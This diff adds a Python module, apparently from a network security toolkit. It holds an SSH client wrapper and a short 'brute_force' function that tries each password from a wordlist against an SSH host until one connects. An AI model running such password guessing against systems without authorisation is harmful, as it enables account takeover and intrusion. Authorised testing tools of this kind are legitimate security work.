@@ -1,0 +1,47 @@
+# NSN (Network Security Navigator)
+# SSH Client Utilities
+
+import _network
+
+class SSHClient:
+    def __init__(self, host, port=22):
+        self.host = host
+        self.port = port
+        self.session = None
+
+    def connect(self, username, password=None, key_file=None):
+        """
+        Connect to an SSH server.
+        """
+        self.session = _network.ssh_new()
+        if key_file:
+            return self.session.connect(self.host, self.port, username, key_file=key_file)
+        else:
+            return self.session.connect(self.host, self.port, username, password=password)
+
+    def execute(self, command):
+        """
+        Execute a command on the remote server.
+        """
+        if not self.session:
+            raise RuntimeError("Not connected")
+        return self.session.execute(command)
+
+    def close(self):
+        if self.session:
+            self.session.close()
+            self.session = None
+
+def brute_force(host, username, wordlist):
+    """
+    Simple SSH brute force attempt.
+    """
+    client = SSHClient(host)
+    for password in wordlist:
+        try:
+            if client.connect(username, password=password):
+                client.close()
+                return password
+        except:
+            pass
+    return None
